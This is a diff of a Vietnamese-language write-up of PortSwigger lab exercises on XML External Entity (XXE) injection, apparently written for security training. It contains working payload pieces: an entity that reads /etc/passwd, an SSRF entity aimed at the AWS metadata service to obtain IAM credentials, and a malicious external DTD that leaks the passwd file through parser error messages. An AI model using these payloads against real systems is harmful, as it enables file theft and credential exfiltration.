@@ -4,15 +4,15 @@
 
 ### Yêu cầu bài tập
 
-Bài thực hành cung cấp một chức năng kiểm tra số lượng hàng tồn kho của sản phẩm có nhiệm vụ tiếp nhận và xử lý dữ liệu đầu vào dưới định dạng XML.
+Bài thực hành cung cấp một chức năng kiểm tra số lượng hàng tồn kho của sản phẩm có nhiệm vụ tiếp nhận và xử lý dữ liệu đầu vào dưới định dạng XML. 
 
-Để hoàn thành bài thực hành, cần thực hiện chèn một thực thể ngoài XML External Entity trỏ đến tệp tin `/etc/passwd` của hệ thống nhằm hiển thị nội dung tệp tin này trong phản hồi của ứng dụng.
+Để hoàn thành bài thực hành, cần thực hiện chèn một thực thể ngoài XML External Entity trỏ đến tệp tin passwd của hệ thống nhằm hiển thị nội dung tệp tin này trong phản hồi của ứng dụng.
 
 ### Phân tích lỗ hổng
 
-Lỗ hổng XXE phát sinh tại chức năng tra cứu sản phẩm tồn kho. Khi người dùng thực hiện yêu cầu kiểm tra hàng tồn kho, ứng dụng gửi một yêu cầu HTTP POST mang dữ liệu XML chứa thông tin mã sản phẩm và mã cửa hàng.
+Lỗ hổng XXE phát sinh tại chức năng tra cứu sản phẩm tồn kho. Khi người dùng thực hiện yêu cầu kiểm tra hàng tồn kho, ứng dụng gửi một yêu cầu HTTP POST mang dữ liệu XML chứa thông tin mã sản phẩm và mã cửa hàng. 
 
-Do trình phân tích cú pháp XML Parser trên máy chủ dịch vụ không vô hiệu hóa tính năng khai báo tài liệu DTD và cho phép xử lý thực thể bên ngoài, tác nhân kiểm thử có thể định nghĩa một thực thể ngoài trỏ tới tệp tin nhạy cảm của hệ thống.
+Do trình phân tích cú pháp XML Parser trên máy chủ dịch vụ không vô hiệu hóa tính năng khai báo tài liệu DTD và cho phép xử lý thực thể bên ngoài, tác nhân kiểm thử có thể định nghĩa một thực thể ngoài trỏ tới tệp tin nhạy cảm của hệ thống. 
 
 Khi parser xử lý tài liệu XML, nó sẽ giải quyết thực thể ngoài này và nạp nội dung của tệp tin đích vào cấu trúc XML. Do ứng dụng hiển thị trực tiếp giá trị của phần tử chứa thực thể này trong phản hồi lỗi hoặc kết quả, nội dung của tệp tin nhạy cảm sẽ bị rò rỉ ra ngoài.
 
@@ -24,14 +24,13 @@ Trang chủ của bài thực hành hiển thị danh sách các sản phẩm c�
 
 Thực hiện truy cập vào trang chi tiết của một sản phẩm bất kỳ. Di chuyển xuống cuối trang để tìm chức năng tra cứu số lượng hàng tồn kho. Nhấp chuột vào nút kiểm tra lượng tồn kho để kiểm tra hoạt động bình thường của chức năng:
 
-![1785727962137](image/Task5.10-PortSwiggerXXE/1785727962137.png)
+![1785729460817](image/Task5.10-PortSwiggerXXE/1785729460817.png)
 
 Kích hoạt công cụ Burp Suite và bật tính năng chặn bắt yêu cầu Intercept. Thực hiện gửi lại yêu cầu kiểm tra hàng tồn kho để ghi lại yêu cầu HTTP tương ứng:
 
 ![1785728168501](image/Task5.10-PortSwiggerXXE/1785728168501.png)
 
 Yêu cầu HTTP POST được gửi tới hệ thống sử dụng định dạng XML ở phần thân với cấu trúc sau:
-
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <stockCheck>
@@ -180,10 +179,7 @@ Cơ chế hoạt động của payload:
 * Khai báo `DOCTYPE` khởi tạo một định nghĩa tài liệu DTD nội bộ có tên là test.
 * Cú pháp thực thể ngoài `<!ENTITY xxe SYSTEM 'http://169.254.169.254/...'>` định nghĩa thực thể xxe liên kết đến URL ngoài thông qua giao thức HTTP.
 * Khi XML Parser xử lý giá trị tham chiếu `&xxe;` trong phần tử productId, nó sẽ thực hiện một yêu cầu kết nối mạng HTTP GET tới địa chỉ dịch vụ metadata của AWS.
-* Khi XML Parser xử lý giá trị tham chiếu `&xxe;` trong phần tử productId, nó sẽ thực hiện một yêu cầu kết nối mạng HTTP GET tới địa chỉ dịch vụ metadata của AWS.
 * Parser tiếp nhận kết quả trả về từ URL dịch vụ và chèn trực tiếp nội dung chuỗi JSON chứa thông tin xác thực IAM vào phần tử productId. Do ứng dụng in ra lỗi khi dữ liệu productId không hợp lệ, toàn bộ chuỗi thông tin bảo mật được trả về trực tiếp trong phản hồi cho người dùng.
-
----
 
 ## Bài tập 3: Khai thác XXE mù để truy xuất dữ liệu thông qua thông báo lỗi
 
@@ -193,7 +189,7 @@ Bài thực hành yêu cầu sử dụng một tệp tin định nghĩa DTD bên
 
 ### Phân tích lỗ hổng
 
-Lỗ hổng phát sinh do trình phân tích XML Parser của ứng dụng cho phép xử lý thực thể bên ngoài và DTD từ nguồn không đáng tin cậy. Mặc dù ứng dụng không hiển thị kết quả phân tích XML trực tiếp ra màn hình, máy chủ vẫn hiển thị chi tiết nội dung thông báo lỗi của hệ thống khi quá trình phân tích xảy ra lỗi.
+Lỗ hổng phát sinh do trình phân tích XML Parser của ứng dụng cho phép xử lý thực thể bên ngoài và DTD từ nguồn không đáng tin cậy. Mặc dù ứng dụng không hiển thị kết quả phân tích XML trực tiếp ra màn hình, máy chủ vẫn hiển thị chi tiết nội dung thông báo lỗi của hệ thống khi quá trình phân tích xảy ra lỗi. 
 
 Bằng cách xây dựng các thực thể lồng nhau để cố tình truy cập vào một đường dẫn tệp tin không tồn tại chứa nội dung của tệp tin passwd, thông báo lỗi của hệ thống sẽ in ra đường dẫn không hợp lệ đó kèm theo toàn bộ dữ liệu của tệp tin passwd trực tiếp trên phản hồi.
 
@@ -223,7 +219,7 @@ Soạn thảo nội dung tệp tin DTD độc hại tại mục Body của Explo
 
 ```xml
 <!ENTITY % file SYSTEM "file:///etc/passwd">
-<!ENTITY % eval "<!ENTITY % exfil SYSTEM 'file:///invalid/%file;'>">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
 %eval;
 %exfil;
 ```
@@ -251,7 +247,7 @@ Phản hồi trả về mã trạng thái lỗi HTTP 400 cùng thông báo lỗi
 
 #### Tại sao cần lưu trữ tệp tin DTD trên máy chủ khai thác bên ngoài?
 
-Theo tiêu chuẩn thiết kế của XML, việc định nghĩa các thực thể tham số lồng nhau và gọi trực tiếp chúng trong DTD nội bộ là hành vi bị cấm bởi hầu hết các trình phân tích cú pháp nhằm ngăn chặn các vòng lặp đệ quy gây cạn kiệt tài nguyên.
+Theo tiêu chuẩn thiết kế của XML, việc định nghĩa các thực thể tham số lồng nhau và gọi trực tiếp chúng trong DTD nội bộ là hành vi bị cấm bởi hầu hết các trình phân tích cú pháp nhằm ngăn chặn các vòng lặp đệ quy gây cạn kiệt tài nguyên. 
 
 Tuy nhiên, quy định này không áp dụng đối với các tệp tin định nghĩa DTD bên ngoài. Do đó, tác nhân kiểm thử phải lưu trữ các thực thể tham số lồng nhau trên một máy chủ độc lập và gọi tệp tin này về máy chủ nạn nhân dưới dạng một thực thể ngoài.
 
@@ -262,35 +258,33 @@ Quá trình xử lý của tệp tin DTD độc hại diễn ra theo các bướ
 * **Bước 1: Thực thể file nạp nội dung tệp tin passwd**
   Khai báo `<!ENTITY % file SYSTEM 'file:///etc/passwd'>` tạo ra một thực thể tham số tên là file. Khi trình phân tích cú pháp XML Parser mở thực thể `%file;`, nội dung của tệp tin `/etc/passwd` được đọc và lưu trữ tạm thời trong bộ nhớ của XML Parser dưới dạng một chuỗi văn bản.
   Ví dụ nội dung tệp tin:
-
   ```text
   root:x:0:0:root:/root:/bin/bash
   daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
   ```
+
 * **Bước 2: Thực thể eval khởi tạo thực thể exfil**
   Khai báo `<!ENTITY % eval '<!ENTITY &#x25; exfil SYSTEM "file:///invalid/%file;">'>` sau khi phân giải mã hóa thực thể `&#x25;` sẽ trở thành:
-
   ```xml
   <!ENTITY % exfil SYSTEM 'file:///invalid/%file;'>
   ```
   Trong đó: `&#x` đại hiện cho cách biểu diễn hệ HEX => `%#x25` = `25H` = 37 (hệ 10) => Ký tự `%` trong bảng mã ASCII.
 
   Sau đó, giá trị của thực thể `%file;` được điền vào đường dẫn. Kết quả là thực thể `%exfil` sẽ trỏ tới một đường dẫn không tồn tại nhưng chứa nội dung của tệp tin passwd:
-
   ```xml
   <!ENTITY % exfil SYSTEM 'file:///invalid/root:x:0:0:root:/root:/bin/bash...'>
   ```
+
 * **Bước 3: Thực thể exfil kích hoạt yêu cầu đọc file không hợp lệ**
   Khi thực hiện gọi thực thể `%exfil;`, trình phân tích cú pháp bắt đầu thử truy cập vào đường dẫn:
-
   ```text
   file:///invalid/root:x:0:0:root:/root:/bin/bash...
   ```
   Do thư mục hoặc đường dẫn này hoàn toàn không tồn tại trên hệ thống máy chủ, quá trình phân tích sẽ bị dừng lại và kích hoạt một thông báo lỗi.
+
 * **Bước 4: Nội dung tệp tin passwd bị rò rỉ qua thông báo lỗi**
   Trình phân tích cú pháp không thể nhận diện được phần nội dung phía sau thư mục `invalid` là dữ liệu nhạy cảm của hệ thống. Trình phân tích chỉ ghi nhận lỗi không thể mở tệp tin tại đường dẫn được cung cấp và thực hiện in toàn bộ đường dẫn đó ra màn hình để hiển thị thông báo lỗi.
   Do đường dẫn chứa nội dung tệp tin passwd do tác nhân kiểm thử kiểm soát, thông báo lỗi vô tình hiển thị toàn bộ dữ liệu này:
-
   ```text
   Could not load the external entity: file:///invalid/root:x:0:0:root:/root:/bin/bash...
   ```
